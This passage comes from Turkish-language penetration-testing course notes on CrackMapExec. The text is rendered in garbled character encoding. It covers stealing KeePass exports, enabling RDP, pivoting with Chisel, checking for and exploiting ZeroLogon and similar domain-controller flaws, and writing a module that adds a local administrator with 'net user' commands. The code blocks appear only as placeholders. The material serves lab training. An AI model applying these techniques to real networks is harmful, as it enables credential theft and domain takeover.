* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




